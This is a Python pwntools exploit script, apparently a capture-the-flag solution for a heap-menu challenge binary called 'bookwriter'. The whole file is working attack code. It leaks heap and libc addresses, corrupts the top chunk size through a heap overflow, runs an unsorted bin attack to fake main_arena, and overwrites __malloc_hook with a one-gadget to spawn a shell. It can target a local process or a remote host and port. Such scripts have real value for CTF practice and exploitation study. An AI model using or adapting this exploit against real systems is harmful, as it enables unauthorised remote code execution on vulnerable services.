#coding:utf-8
from pwn import *

context.binary = './bookwriter'
context.terminal=["tmux", "sp", "-h"]

def add(Size, Content):
    io.recvuntil('Your choice :')
    io.sendline(str(1))
    io.recvuntil('Size of page :')
    io.sendline(str(Size))
    io.recvuntil('Content :')
    io.send(Content)

def view(Id):
    io.recvuntil('Your choice :')
    io.sendline(str(2))
    io.recvuntil('Index of page :')
    io.sendline(str(Id))

def edit(Id,Content):
    io.recvuntil('Your choice :')
    io.sendline(str(3))
    io.recvuntil('Index of page :')
    io.sendline(str(Id))
    io.recvuntil('Content:')
    io.send(Content)

def information(Author):
    io.recvuntil('Your choice :')
    io.sendline(str(4))
    io.recvuntil('A'*0x40)
    addr = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x10
    io.recvuntil('(yes:1 / no:0) ')
    io.sendline(str(1))
    io.recvuntil('Author :')
    io.send(Author)
    return addr

def exploit():
    # leak heap_base
    io.recvuntil('Author :')
    Author = 'A'*0x40
    io.send(Author)
    # Heap Overflow to Modify TopChunk Size 
    add(0x28,'0'*0x28)          #id=0
    edit(0,'1'*0x28)
    edit(0,'\x00'*0x28+p16(0xfd1)+"\x00")
    # Trigger sysmalloc ==> _int_free TopChunk
    add(0x1000,'1'+'\n')        #id=1
    # leak libc_base
    add(0x1,'x')                #id=2
    view(2)
    io.recvuntil('Content :\n')
    if len(sys.argv)==1:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-(0x3c4b20+1624)
    else:
        libc.address = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-(0x3c3b20+1624)
    log.info('libc_base:'+hex(libc.address))
    system_addr = libc.symbols['system']
    log.info('system_addr:'+hex(system_addr))
    if len(sys.argv)==1:
        main_arena_top = libc.address+0x3c4b20+0x58
    else:
        main_arena_top = libc.address+0x3c3b20+0x58
    log.info('TopChunk:'+hex(main_arena_top)) 
    malloc_hook = libc.symbols['__malloc_hook']
    log.info('malloc_hook:'+hex(malloc_hook))
    if len(sys.argv)==1:
        one_gadgets = libc.address+0xf1117
    else:
        one_gadgets = libc.address+0xf0567
    log.info('one_gadgets:'+hex(one_gadgets))
    #leak heap_base
    heap_base = information('A'*0x40)
    log.info('heap_base:'+hex(heap_base))
    information('A'*0x30+p64(0)+p64(0))
    # Index Overflow
    for i in range(0x3,0x9):
        add(0x20,str(i)*0x20)
    # UnsortedBin Attack to modify Topchunk->unsortedbin(av) 
    payload = 0x2d*p64(0)+p64(0xa11)
    payload += p64(0)+p64(0x6020a0-0x10)
    # Trigger UnsortedBin Attack 
    edit(0,payload)
    add(0xa00,"\x00"*0x10)
    # Fake main_arena to make sure next malloc will alloc __malloc_hook
    edit(0,p64(malloc_hook-0x10)+p64(0)+2*p64(main_arena_top))
    edit(0,"\n")
    # __malloc_hook -->one_gadgets
    add(0x10,p64(one_gadgets))
    edit(0,"\n")
    # Spawn shell
    io.recvuntil('Your choice :')
    io.sendline(str(1))
    io.recvuntil('Size of page :')
    io.sendline(str(0x10))

    io.interactive()

if __name__ == '__main__':
    log.info('For remote %s HOST POST'% sys.argv[0])
    elf = ELF('./bookwriter')
    if len(sys.argv)>1:
        # context.log_level = 'debug'
        io = remote(sys.argv[1], int(sys.argv[2]))
        libc = ELF('./libc_64.so.6')
        exploit()
    else:
        # io = process('./bookwriter',env={'LD_PRELOAD':'./libc_64.so.6'})
        io = process('./bookwriter',env={'LD_PRELOAD':'/lib/x86_64-linux-gnu/libc.so.6'})
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        # libc = ELF('./libc_64.so.6')
        context.log_level ='debug'
        exploit()

